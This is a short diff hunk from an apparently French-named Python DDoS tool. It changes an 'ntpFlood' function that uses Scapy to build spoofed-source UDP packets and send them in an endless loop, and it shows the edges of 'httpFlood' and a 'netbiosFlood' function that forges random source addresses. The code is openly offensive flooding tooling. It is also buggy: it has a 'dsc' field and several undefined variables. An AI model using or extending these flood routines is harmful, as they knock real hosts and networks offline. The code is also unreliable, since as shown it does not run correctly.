@@ -148,14 +148,14 @@ def httpFlood(cible,port):
 
 		time.sleep(15)
 
-def ntpFlood(cible, source):
-	hostname = socket.gethostname()
-	target = socket.gethostbyname(hostname)
-	nameserver = ip
-	domain=""
+def ntpFlood(ip, port):
+    hostname = socket.gethostname()
+    target = socket.gethostbyname(hostname)
+    nameserver = ip
+    domain=""
 
-	pkt = IP(dsc=target, src=nameserver)/UDP(sport=random.randint(1000, 65535),dport=port)/Raw(load=data)
-	send(pkt,loop=1)
+    pkt = IP(dsc=target, src=nameserver)/UDP(sport=random.randint(1000, 65535),dport=port)/Raw(load=data)
+    send(pkt,loop=1)
 
 def netbiosFlood(cible):
 	ip = IP(src=RandIP("192.168.1.1/24"), dst=addr)
